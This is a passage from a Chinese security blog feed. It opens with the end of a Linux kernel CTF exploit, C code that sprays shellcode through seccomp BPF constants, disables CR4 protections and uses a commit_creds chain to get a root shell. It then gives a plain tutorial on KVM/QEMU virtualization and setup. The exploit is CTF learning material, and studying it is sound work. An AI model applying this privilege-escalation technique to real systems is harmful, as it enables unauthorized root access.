= <span class="hljs-number">0</span>;<br>        bpf_prog[i].k = <span class="hljs-number">0x3c909090</span>;<br>    &#125;<br><br>    bpf_prog[BPF_PROG_LEN - <span class="hljs-number">1</span>].code = <span class="hljs-number">0x06</span>;<br>    bpf_prog[BPF_PROG_LEN - <span class="hljs-number">1</span>].jt = <span class="hljs-number">0</span>;<br>    bpf_prog[BPF_PROG_LEN - <span class="hljs-number">1</span>].jf = <span class="hljs-number">0</span>;<br>    bpf_prog[BPF_PROG_LEN - <span class="hljs-number">1</span>].k = <span class="hljs-number">0x7fff0000</span>;<br>    <br>    start = BPF_PROG_LEN - <span class="hljs-number">0x100</span>;<br>    <span class="hljs-comment">//xor rax,rax;mov ah,0x06;mov al,0xf0;mov cr4,rax</span><br>    bpf_prog[start++].k = <span class="hljs-number">0x3cc03148</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c9006b4</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c90f0b0</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3ce0220f</span>;<br><br>    <span class="hljs-comment">//xor rax,rax; mov ah,0x80; mov al,0x00; mov rsp, rax </span><br>    bpf_prog[start++].k = <span class="hljs-number">0x3cc03148</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c9090b4</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c9000b0</span>;<br><br>    bpf_prog[start++].k = <span class="hljs-number">0x3cc48948</span>;<br><br>    <span class="hljs-comment">//push 0; pop rdi; call [rsp]; pop rdx; nop; nop; push rax; pop rdi;ret </span><br>    bpf_prog[start++].k = <span class="hljs-number">0x3c5f006a</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c2414ff</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3c90905a</span>;<br>    bpf_prog[start++].k = <span class="hljs-number">0x3cc35f50</span>;<br><br>    <span class="hljs-built_in">set_seccomp</span>((<span class="hljs-type">char</span> *)bpf_prog, BPF_PROG_LEN);    <br>    fake_stack = <span class="hljs-built_in">mmap</span>((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>, PAGE_SZ*<span class="hljs-number">16</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(fake_stack, <span class="hljs-string">&#x27;\x00&#x27;</span>, PAGE_SZ*<span class="hljs-number">16</span>);<br>    idx = <span class="hljs-number">0x1000</span>;<br>    fake_stack[idx++] = PREARE_KERNEL_CRED;<br>    fake_stack[idx++] = COMMIT_CREDS;<br>    fake_stack[idx++] = SWAPGS_RESTORE;<br>    fake_stack[idx++] = <span class="hljs-number">0xdeadbeef</span>;<br>    fake_stack[idx++] = <span class="hljs-number">0xdeadbeef</span>;<br>    fake_stack[idx++] = (<span class="hljs-type">size_t</span>)get_shell;<br>    fake_stack[idx++] = user_cs;<br>    fake_stack[idx++] = user_rflags;<br>    fake_stack[idx++] = user_sp + <span class="hljs-number">8</span>;<br>    fake_stack[idx++] = user_ss;<br>    <br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">seccon</span>(<span class="hljs-number">0xffffffffc00009b1</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="极、参考链接"><a href="#极、参考链接" class="headerlink" title="极、参考链接"></a>极、参考链接</h1><blockquote><p><a href="https://arttnba3.cn/">https://arttnba3.cn/</a></p></blockquote><blockquote><p><a href="https://blingblingxuanxuan.github.io/">https://blingblingxuanxuan.github.io/</a></p></blockquote><blockquote><p><a href="https://kiprey.gitee.io/2021/10/kernel_pwn_introduction/#3-tty-struct-%E7%BB%93%E6%9E%84%E7%9A%84%E5%88%A9%E7%94%A8">https://kiprey.gitee.io/2021/10/kernel_pwn_introduction&#x2F;</a></p></blockquote><blockquote><p><a href="http://blog.jcix.top/2018-10-01/userfaultfd_intro/">http://blog.jcix.top/2018-10-01/userfaultfd_intro&#x2F;</a></p></blockquote><blockquote><p><a href="https://www.willsroot.io/">https://www.willsroot.io/</a></p></blockquote><blockquote><p><a href="https://www.anquanke.com/post/id/263803">https://www.anquanke.com/post/id/263803</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>kernel</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KVM_Qemu</title>
    <link href="/2023/06/22/KVM-Qemu/"/>
    <url>/2023/06/22/KVM-Qemu/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h1><p>说到虚拟化，经常与底层打交道的同学可能十分熟悉，并且咱们平时办公学习可能会接触到不同的操作系统环境，因此这里我们都会普遍用到一个名叫虚拟机的技术，接下来我们就将重点介绍一下这一方面的具体知识</p><h2 id="0x00-虚拟化整体架构"><a href="#0x00-虚拟化整体架构" class="headerlink" title="0x00 虚拟化整体架构"></a>0x00 虚拟化整体架构</h2><p>首先从架构来说，系统虚拟化的核心思想就是将一台物理机系统虚拟化为多台虚拟机计算机系统，一般来说其中的虚拟环境分为以下三个部分：</p><ol><li>硬件(处理器、内存、IO、网络接口等)</li><li>VMM（Virtual Machine Monitor, 虚拟机监控器，别名Hypervisor）：负责管理所有资源和虚拟环境支持</li><li>虚拟机</li></ol><p>其中如果没有进行系统虚拟化，那么我们的计算机操作系统是直接运行在硬件之上的，在系统虚拟化之后，VMM就成了其中重要的一份子，他取代了传统操作系统的位置，用来调配真实物理硬件，成为了他的管理者，然后向上层软件提供虚拟的硬件平台，而上层的虚拟硬件平台我们又可以通过构建不同的操作系统来达成一套物理硬件环境下同时存在多个操作系统的效果，具体情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9a504fc2d5628535dd6cedead5ef76c6a6ef6368.jpg"></p><p>然后我们引入两个基本指令概念——特权指令和敏感指令</p><ul><li>特权指令：系统中用来操作和管理资源的指令，在现在的操作系统当中大部分只使用到了ring0和ring3，以此来区别内核和用户，该特权指令就是仅系统软件所能使用的指令</li><li>敏感指令：虚拟化世界里面操作特权资源的指令</li></ul><p>所以，他俩可以看作一个容纳的关系，也就是特权指令一定是敏感指令，但敏感指令不一定是特权指令，而我们VMM的实现功能中就有完全控制系统资源，敏感指令应该设置为必须在VMM的监控审查下进行，如果说一个系统上所有敏感指令都是特权指令，则我们称其可虚拟化。VMM运行在系统的最高特权级上，然后客户机操作系统运行在非最高特权级上，此时如果客户机操作系统执行敏感指令，他就会陷入到VMM，VMM再模拟执行引起异常的敏感指令，这种方法被称为“陷入再模拟”</p><p>但如果说我么的敏感指令并不都是特权指令，那也就是说有的敏感指令无法触发异常，这样就会存在虚拟化漏洞，这也就被定义为不可虚拟化。<br>接下来我们来介绍VMM的几个重要功能</p><h2 id="0x01-处理器虚拟化"><a href="#0x01-处理器虚拟化" class="headerlink" title="0x01 处理器虚拟化"></a>0x01 处理器虚拟化</h2><p>我们在x86下实现虚拟化，需要在客户机操作系统下加入虚拟化层,该虚拟化层必须处于ring0级别，而客户机操作系统必须是ring0以上的级别。而如果我们客户机中的特权指令若不是运行在ring0级别会导致虚拟化漏洞，而基于软件虚拟化技术弥补这一漏洞的手段有以下两种：</p><ol><li>全虚拟化：采用二进制代码动态翻译技术（Dynamic Binary Translation），也就是碰到客户机操作系统无法触发异常的敏感指令，会进行一个转换过程，然后由宿主机进行执行,此时客户机不知道自己是虚拟的，以为自己就是正常运行再物理环境下；</li><li>半虚拟化：通过修改客户机操作系统，将所有的敏感指令替换为对底层虚拟化平台的超级调用。此时客户机知道自己处于虚拟环境。</li></ol><p>几种架构对比如下，由左至右分别是未虚拟化、全虚拟化、半虚拟化：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4b90f603738da9778c38bee0f551f8198718e3e2.jpg"></p><h3 id="1-vCPU"><a href="#1-vCPU" class="headerlink" title="1.vCPU"></a>1.vCPU</h3><p>硬件虚拟化采用vCPU(virtual CPU)描述符来描述虚拟CPU，实际上就是一个结构体。在VMM创建客户机的时候，首先要为客户机创建一个vCPU，然后通过VMM进行调度，类似于进程调度。</p><h3 id="2-Intel-VT-x"><a href="#2-Intel-VT-x" class="headerlink" title="2.Intel VT-x"></a>2.Intel VT-x</h3><p>虽然我们可以通过处理器软件虚拟化来实现VMM，但是增加了系统的复杂性和开销，因此如果我们在CPU中加入对虚拟化的支持，那么就可以使得系统软件更高效的实现虚拟化，其中该类硬件辅助虚拟化技术就有标题的Intel VT-x和即将讲到的AMD SVM.这俩分别是Intel和AMD两大CPU公司提供的技术。<br>我们上文讲到一般我们指令的虚拟化是采用<code>陷入再模拟</code>的方式实现的，而IA32架构有19条敏感指令不能通过该方法处理，因此导致了虚拟化漏洞。因此Intel VT中VT-x技术为处理器增加了一套名为<code>Virtual Machine Extensions,VMX</code>，也就是虚拟机扩展的指令集，其中包含十条左右用来支持虚拟化相关的操作，且其中也引入了两种操作模式，统称为VMX操作模式：</p><ol><li>根操作模式（VMX Root Operation）：VMM运行所处模式</li><li>非根操作模式（VMX Non-Root Operation）：客户机运行所处模式</li></ol><p>在非根模式下，所有敏感指令（包括那19条不能被虚拟化的敏感指令）的行为都被重新定义，使得他们可以不通过虚拟化就直接运行或通过<code>陷入再模拟</code>的方式来处理；再根模式下，他所有指令就如传统IA32一样没有改变。<br>这两种模式均具有0和3特权级，因此描述程序运行在某个特权级应该具体指明处于何种模式。</p><p>而该VMX模式在默认情况下是关闭的，当VMM需要使用这个功能的时候，就可以使用VT-x提供的指令来打开此操作模式，大致过程如下：</p><ol><li>VMM执行VMXON进入VMX操作模式，此时CPU处于VMX根操作模式，VMM软件开始执行</li><li>VMM执行VMLAUNCH或VMRESUME产生VM-Entry,客户机软件开始执行，此时CPU从根模式转换成非根模式</li><li>当客户机执行特权指令，或者客户机发送中断或异常，VM-Exit被触发然后陷入VMM，CPU自动从非根模式切换到根模式，VMM根据其原因做相应处理，然后转至步骤2继续执行</li><li>如果VMM决定退出，则执行VMXOFF关闭VMX操作模式</li></ol><p><img src="http://imgsrc.baidu.com/forum/pic/item/34fae6cd7b899e519d9501df07a7d933c9950de5.jpg"></p><p>此外还有VMCS来支持处理器虚拟化，他是一个保存在内存当中的数据结构，一般包含如下几个重要字段：</p><ol><li>vCPU标识信息：标识vCPU的一些属性</li><li>虚拟寄存器信息：虚拟的寄存器资源</li><li>vCPU状态信息：标识vCPU当前状态</li><li>额外寄存器&#x2F;部件信息：存储VMCS中没有保存的一些寄存器或CPU部件</li><li>其他信息：存储VMM进行优化或者额外信息的字段</li></ol><p>每一个VMCS对应一个虚拟CPU需要的相关信息，CPU在发生VM-Exit和VM-Entry时都会自动查询和更新VMCS</p><p>总结以下，整个VT-x架构可以用下图表示</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df3d7ca7bcb0a460248b0f22e63f6246a60af97.jpg"></p><h3 id="3-AMD-SVM"><a href="#3-AMD-SVM" class="headerlink" title="3.AMD SVM"></a>3.AMD SVM</h3><p>Intel说完了，他的老对手AMD当然也得讲一下，在其中的SVM当中，有很多同Intel VT-x类似的地方，例如他也有根模式和非根模式等，只不过技术上略有不同，这里涉猎较少就掠过了</p><h2 id="0x02-内存虚拟化"><a href="#0x02-内存虚拟化" class="headerlink" title="0x02 内存虚拟化"></a>0x02 内存虚拟化</h2><p>VMM提供一个虚拟的物理地址空间给客户机操作系统，因此客户机会认为其中的物理地址是连续的，但其实他在真实的物理地址上是随意分布的，因此客户机的物理地址不能直接被发送到系统容总线上去，VMM需要先将客户机物理地址转换为实际的物理地址再交给处理器执行，因此需要解决下面两个问题：</p><ol><li>维护宿主机物理地址和客户机物理地址之间的映射关系</li><li>截获宿主机对客户机物理地址的访问，并根据所记录的映射关系转换成宿主机物理地址</li></ol><p>第一个问题中，有两轮地址转换，分别是客户机虚拟地址（GVA，Guest Virtual Address）-&gt;客户机物理地址（GPA，Guest Virtual Address）-&gt;宿主机虚拟地址（HPA，Host Physical Address），其中第一轮转换是由客户机操作系统通过VMCS（AMD SVM 中的VMCB）中客户机状态域的CR3,也就是pdbr指向的页表来进行转换，也就是客户机自己的一个页目录表，然后第二轮转换则是由VMM决定。</p><p>而传统IA32架构只支持以此地址转换，这和虚拟化需要两次转换相矛盾，因此存在一种解决方式，就是直接建立GVA到HPA的映射，其中存放映射关系的表叫做<code>影子页表</code>，也就是<code>Shadow Page Table</code>，但是缺点也十分明显，即映射机制十分复杂。</p><p>因此为了优化这一点，Intel公司提供EPT技术，AMD公司提供AMD NPT技术，直接在硬件上支持GVA-&gt;GPA-&gt;HPA的两次地址转换。</p><p>而第二个问题的解决方法是让客户机对宿主机物理地址的访问每一次都触发异常，由VMM查询地址转换表再模仿其访问，但是性能较差</p><h3 id="1-Intel-EPT"><a href="#1-Intel-EPT" class="headerlink" title="1.Intel EPT"></a>1.Intel EPT</h3><p>EPT页表存在于VMM内核空间，由VMM来维护，其EPT页表基地址由VMCS的字段来指定，包含了EPT页表的宿主机系统物理地址，通过该页表能够将客户机物理地址最直接翻译成宿主机物理地址，我们这里通过一个流程图来了解此时地址转换的一个过程</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0824ab18972bd407b3e8f0363e899e510eb309c9.jpg"></p><p>假设为二级页表。此时地址翻译过程如下：</p><ol><li>首先通过CR3找到客户机的页表，此时指向的是客户机物理地址GPA，然后CPU通过EPT TLB来进行一个缓存搜索，找到则直接返回HPA，否则CPU再通过EPT MMU，从EPT页表中找到对应值返回HPA</li><li>此时通过GVA在页目录中的对应表项来获取L1页表项的GPA，然后重复上述操作获取HPA，最后找到我们想要访问的GPA，然后再次进行对应转换即可得到最终的HPA</li></ol><p>从上面过程中我们可以得知，CPU需要进行大量的内存访问才可以实现最终的地址转换，因此一般我们将EPT TLB设置大一点来尽量减少访问次数。<br>可能有同学觉得这个根影子页表差不多，但是需要注意一点的是，影子页表是我们基于软件层面实现的，因此十分缓慢且复杂，而这个EPT则是直接由硬件支持，速度快且实现简单。</p><h2 id="0x03-I-x2F-O虚拟化"><a href="#0x03-I-x2F-O虚拟化" class="headerlink" title="0x03 I&#x2F;O虚拟化"></a>0x03 I&#x2F;O虚拟化</h2><h2 id="0x04-构建KVM环境"><a href="#0x04-构建KVM环境" class="headerlink" title="0x04 构建KVM环境"></a>0x04 构建KVM环境</h2><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c87015b16532a627f9e2f0608ff5f.jpg"></p><p>KVM是一种用于Linux内核中的虚拟化基础设置，可以将Linux内核转化为一个Hypervisor(VMM),其具体实现方式就是在Linux内核上通过加载一个新的模块使得Linux内核变成一个Hypervisor,在主流Linux内核的v2.6.20后，KVM已经成为了主流Linux内核的一个模块嵌入其中，他不仅支持Linux客户操作系统的虚拟化，同时也支持其他硬件对虚拟化敏感的Windows系统的虚拟化</p><h3 id="1-KVM运行过程概述"><a href="#1-KVM运行过程概述" class="headerlink" title="1.KVM运行过程概述"></a>1.KVM运行过程概述</h3><p>首先我们知道，KVM模块让Linux主机成为了一个虚拟机监视器，并且在原有的Linux两种执行模式-用户模式和内核模式，增加了一种新的模式，那就是客户模式，他执行非IO的客户代码，虚拟机运行在这个模式之下。</p><p>在KVM的模型当中，每一个虚拟机都是一个由Linux调度程序管理的标准进程，都可以使用Linux进程管理命令进行管理，这样就使得我们Linux内核也成为了一个Hypervisor了。<br>当KVM内核模块被内核加载的时候，KVM模块会首先初始化内部的数据结构，然后检测系统当前的CPU，打开CR4控制器的虚拟化模式开关，通过执行VMXON指令将宿主操作系统（包括KVM模块本身）置于虚拟化模式中的根模式，然后创建特殊设备文件<code>/dev/kvm</code>并且等待来自用户空间的命令，接下来就是用户程序（qemu）和KVM模块的相互配合，主要是通过ioctl调用来进行管理。</p><h3 id="2-KVM与QEMU的关系"><a href="#2-KVM与QEMU的关系" class="headerlink" title="2.KVM与QEMU的关系"></a>2.KVM与QEMU的关系</h3><p>事实上，qemu自身就有一套完整的虚拟机实现，包括处理器虚拟化、内存虚拟化以及等等外设的模拟，但是他是纯软件实现，因此效率极低，此时有人就提议将KVM和QEMU结合使用，于是他们就修改了qemu的部分代码，使得qemu可以控制KVM内核模块。KVM和QEMU相互配合，QEMU可以通过KVM达到硬件虚拟化的速度，而KVM通过QEMU来模拟设备。他俩的关系简单来讲，就是KVM只模拟CPU和内存，因此一个客户机操作系统可以在宿主机上面运行，但是你看不到他，无法通过外设与他沟通，而我们就可以通过修改QEMU代码，把qemu中模拟CPU，内存的部分换成KVM，而网卡、显示器等保留，因此QEMU+KVM就构成了一个完整的虚拟化平台</p><h3 id="3-宿主机Linux环境"><a href="#3-宿主机Linux环境" class="headerlink" title="3.宿主机Linux环境"></a>3.宿主机Linux环境</h3><p>我们本次的宿主环境是Ubuntu 20.04，我们可以通过使用命令<code>cat /etc/issue</code>查看，如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ cat /etc/issueUbuntu 20.04.7 LTS \n \l</code></pre><p>这里有个点需要注意，如果你的宿主机是安装在vmware workstation上面（我就是这样，虚拟中的虚拟机中的虚拟机），需要勾选这里才可以,注意我这里灰着是因为虚拟机还开着，他需要关闭虚拟机的时候才可以设置</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9d2e82ab0ac2d562843568d5.jpg"></p><p>然后我们可以查看CPU是否支持KVM，也就是是否支持虚拟化，可以使用如下命令<code>grep -E -o &#39;vmx|svm&#39;/proc/cpuinfo</code></p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ grep -E &#39;(svm|vmx)&#39; /proc/cpuinfoflags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves arat avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg avx512_vpopcntdq rdpid md_clear flush_l1d arch_capabilitiesflags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves arat avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg avx512_vpopcntdq rdpid md_clear flush_l1d arch_capabilities</code></pre><p>然后里面可以发现确实存在vmx，说明我们的处理器是支持虚拟化了已经。</p><p>我们此时可以查看一下我们的内核版本，如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ uname -r4.15.0-142-generic</code></pre><p>在linux内核2.6.20版本后KVM已经正式加入到内核发行代码当中，因此咱们没必要下载KVM源码进行编译，我们再次来确认模块当中是否含有KVM,如下：</p><pre><code class="hljs">dawn@dawn-virtual-machine:~$ lsmod|grep kvmkvm_intel             217088  0kvm                   614400  1 kvm_intelirqbypass              16384  1 kvm</code></pre><h3 id="4-qemu安装"><a href="#4-qemu安装" class="headerlink" title="4.qemu安装"></a>4.qemu安装</h3><p><img src="http://imgsrc.baidu.com/forum/pic/item/18d8bc3eb13533fad316bfe5edd3fd1f40345b5c.jpg"></p><p>首先咱们安装依赖环境，如下（注意l和1的区别）：</p><pre><code class="hljs">sudo apt-get install gcc libsdl1.2-dev zlib1g-dev libasound2-dev linux-kernel-headers pkg-config libgnutls-dev libpci-dev</code></pre><p>依赖装完，我们来下载qemu的源码，直接clone下来</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/qemu/qemu-2.2.1$ git clone https://gitlab.com/qemu-project/qemu.gitCloning into &#39;qemu&#39;...remote: Enumerating objects: 670896, done.remote: Counting objects: 100% (62/62), done.remote: Compressing objects: 100% (61/61), done.remote: Total 670896 (delta 23), reused 0 (delta 0), pack-reused 670834Receiving objects: 100% (670896/670896), 261.02 MiB | 10.61 MiB/s, done.Resolving deltas: 100% (558496/558496), done.Checking connectivity... done.</code></pre><p>然后我们cd到qemu目录下，执行</p><pre><code class="hljs">./configure </code></pre><p>然后安装即可：<code>make</code> <code>make install</code>，此处可以采取多线程编译，如果说嫌自己编译太麻烦，可以直接使用<br> <code>sudo apt-get install qemu-system qemu-user</code>来进行下载</p><h3 id="5-客户机安装步骤"><a href="#5-客户机安装步骤" class="headerlink" title="5.客户机安装步骤"></a>5.客户机安装步骤</h3><p>首先创建一个镜像文件来做我们的虚拟硬盘，有两种方式：</p><ol><li>dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;ubuntu.img bs&#x3D;1M count&#x3D;8192,其中&#x2F;dev&#x2F;zero这个设备会产生无限的0，也就是说这个操作使得我们生成了一个大小为8192字节的虚拟硬盘，且内容全0；</li><li>qemu-img create -f qcow2 win7.img 10G,其中qcow2是文件格式</li></ol><p>然后我们需要准备安装系统的ISO文件，这里我们直接到Ubuntu官网下载一个14.04的历史镜像作为我们的客户机<br>,然后我们直接开启虚拟机，注意这里的参数搭配</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/KVMlearning$ sudo qemu-system-x86_64 -enable-kvm -m 1024 -smp 4 -boot order=cd -hda ./ubuntu.img -cdrom ./ubuntu-14.04.6-desktop-amd64.iso</code></pre><p>我们来讲解下面命令的几个基本参数</p><ul><li><code>-enable-kvm</code>:表示使用kvm内核开启虚拟机加速，而不是qemu自己的内核。</li><li><code>-m 1024</code>：表示给客户机分配1024MB内存</li><li><code>-smp 4</code>：表示分配给客户机4个CPU</li><li><code>-boot order=cd</code>:表示指定系统的启动顺序为光驱<code>CD-ROM</code>而不是硬盘<code>hard Disk</code></li><li><code>-hda</code>：我们刚刚创建的镜像文件用来作为客户机的硬盘</li><li><code>-cdrom</code>：表示分配给客户机的光驱，并在光驱中使用我们上面准备的ISO文件作为系统的启动文件</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251f05f33333e286c9177e3e53f1.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/10dfa9ec8a136327668415f8d48fa0ec09fac794.jpg"></p><p>可以看到，由于我是在vmware workstation上面运行的我的ubuntu 20.04，此时再在里面使用qemu开启另一个14.04虚拟机，<br>然后我们按照步骤进行安装即可<br><img src="http://imgsrc.baidu.com/forum/pic/item/ca1349540923dd542d2470a39409b3de9d8248a2.jpg"></p><p>上面的启动参数类似于咱们重装系统从usb中启动，当我们安装成功之后就不需要这么多参数了，我们只需要从我们建立的虚拟硬盘启动即可</p><pre><code class="hljs">qemu-system-x86_64 -enable-kvm -m 1024 -smp 4 -hda ubuntu.img</code></pre><h2 id="0x05-KVM核心模块解析"><a href="#0x05-KVM核心模块解析" class="headerlink" title="0x05 KVM核心模块解析"></a>0x05 KVM核心模块解析</h2><p>首先讲解qemu的一些标准选项</p><ul><li><code>-name name</code>:设定客户机名称</li><li><code>-M machine</code>:设定要模拟的主机类型，例如Ubuntu 14.04PC等</li><li><code>-m megs</code>:设定客户机的RAM大小</li><li><code>-cpu model</code>:设定CPU模型，例如qemu32、qemu64等</li><li><code>-smp</code>:设定模拟的SMP架构中CPU的个数</li><li><code>-numa opts</code>:指定模拟多节点的numa设备</li><li><code>-fda file</code>:指定file作为软盘镜像</li><li><code>-hda/b/c/d file</code>:使用指定file作为硬盘镜像</li><li><code>-cdrom file</code>:使用指定file作为CD-ROM镜像，需要注意-cdrom和-hdc不可同时使用</li></ul><h3 id="1-内核模块组成"><a href="#1-内核模块组成" class="headerlink" title="1.内核模块组成"></a>1.内核模块组成</h3><p>Linux内核2.6.20版本后就将KVM收入到内核当中，主要位于<code>/virt</code>,<code>/arch/x86/kvm</code>这两个目录当中，要想分析<code>Linux Kernel</code>，<code>Makefile</code>和<code>Kconfig</code>是理解源代码的最好的地图。Kconfig中包含主要的有三个选项：<br> <code>KVM</code>，<code>KVM-INTEL</code>,<code>KVM-AMD</code>,其中<code>KVM</code>选项是KVM的开关，后面两个就是对应不同厂商。下面我们来看看makefile</p><pre><code class="hljs"># SPDX-License-Identifier: GPL-2.0ccflags-y += -I $(srctree)/arch/x86/kvmccflags-$(CONFIG_KVM_WERROR) += -Werrorifeq ($(CONFIG_FRAME_POINTER),y)OBJECT_FILES_NON_STANDARD_vmenter.o := yendifKVM := ../../../virt/kvkvm-y+= $(KVM)/kvm_main.o $(KVM)/coalesced_mmio.o \                $(KVM)/eventfd.o $(KVM)/irqchip.o $(KVM)/vfio.o \                $(KVM)/dirty_ring.o $(KVM)/binary_stats.okvm-$(CONFIG_KVM_ASYNC_PF)+= $(KVM)/async_pf.okvm-y+= x86.o emulate.o i8259.o irq.o lapic.o \               i8254.o ioapic.o irq_comm.o cpuid.o pmu.o mtrr.o \               hyperv.o debugfs.o mmu/mmu.o mmu/page_track.o \               mmu/spte.oifdef CONFIG_HYPERVkvm-y+= kvm_onhyperv.oendifkvm-$(CONFIG_X86_64) += mmu/tdp_iter.o mmu/tdp_mmu.okvm-$(CONFIG_KVM_XEN)+= xen.okvm-intel-y+= vmx/vmx.o vmx/vmenter.o vmx/pmu_intel.o vmx/vmcs12.o \               vmx/evmcs.o vmx/nested.o vmx/posted_intr.okvm-intel-$(CONFIG_X86_SGX_KVM)+= vmx/sgx.okvm-amd-y+= svm/svm.o svm/vmenter.o svm/pmu.o svm/nested.o svm/avic.o svm/sev.oifdef CONFIG_HYPERVkvm-amd-y+= svm/svm_onhyperv.oendifobj-$(CONFIG_KVM)+= kvm.oobj-$(CONFIG_KVM_INTEL)+= kvm-intel.oobj-$(CONFIG_KVM_AMD)+= kvm-amd.o</code></pre><p>我们可以看到主要的就是最后三行是主要的点，其中第一项即为KVM核心模块，后面两项就是厂商独立模块了。</p><h3 id="2-KVM内核源码结构"><a href="#2-KVM内核源码结构" class="headerlink" title="2.KVM内核源码结构"></a>2.KVM内核源码结构</h3><p>先简单介绍下KVM的基本工作原理：<br>用户模式的qemu通过接口<code>libkvm</code>通过<code>ioctl</code>系统调用进入内核模式,<code>KVM Driver</code>为虚拟机创建虚拟内存和虚拟CPU后执行<code>VMLAUNCH</code>指令进入客户模式，装在客户机且执行。如果客户机发生外部中断或者影子页表却也之类的情况，那就暂停客户机的执行，退出客户模式进行一些必要的处理。处理完毕后重新进入客户模式，执行客户代码。如果发生I&#x2F;O事件或者信号队列中有信号到达，就会进入用户模式处理。KVM采用全虚拟化技术，客户机不用修改就可以运行。如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7af40ad162d9f2d3a5a2fe24ecec8a136227cc4f.jpg"></p><p>而KVM内核模块的实现当中主要包括三大部分：虚拟机的调度执行，内存管理，设备管理。</p><h4 id="虚拟机调度执行"><a href="#虚拟机调度执行" class="headerlink" title="虚拟机调度执行"></a>虚拟机调度执行</h4><p>直接上图<br><img src="http://imgsrc.baidu.com/forum/pic/item/0e2442a7d933c89564055db0941373f083020086.jpg"></p><h4 id="KVM中的内存管理"><a href="#KVM中的内存管理" class="headerlink" title="KVM中的内存管理"></a>KVM中的内存管理</h4><p>KVM使用影子页表实现客户机物理地址到主机物理地址的转换。在KVM中存在一个哈希列表和哈希函数，以客户机页表项中的虚拟页号和该页表所在页表的级别作为键值，如果不为空则说明影子页表已经形成，为空则需要新生成一张表，KVM将获取指向该影子页表的主机物理页号填充到相应的影子页表项的内容中。如果客户机os当中出现进程切换，我们的影子页表就需要全部删除重建。</p><h4 id="KVM中的设备管理"><a href="#KVM中的设备管理" class="headerlink" title="KVM中的设备管理"></a>KVM中的设备管理</h4><p>KVM通过移植QEMU的设备模型进行设备的管理和访问。在操作系统当中，软件使用可编程I&#x2F;O(Programmable Input&#x2F;Output,PIO)和内存映射(Memory Mapping Input&#x2F;Output,MMIO)与硬件进行交互。硬件可以发出中断请求给可编程控制器，然后通过控制器来经过INTR线来向CPU发出中断请求。所以虚拟机需要捕获并且模拟PIO和MMIO的请求。</p><ul><li>PIO的捕获：硬件直接提供。当VM发出PIO指令的时候，会发出<code>VM Exit</code>然后硬件会将其原因及对应的指令写入VMCS控制结构当中，这样KVM就会模拟PIO的指令</li><li>MMIO的捕获：对MMIO页的访问导致缺页异常，被KVM捕获，然后通过x86模拟器模拟执行MMIO指令。其中KVM中的I&#x2F;O虚拟化都是通过QEMU实现的，而所有的PIO和MMIO指令都是转发到QEMU的</li></ul><h3 id="3-KVM-API"><a href="#3-KVM-API" class="headerlink" title="3.KVM API"></a>3.KVM API</h3><p>KVM 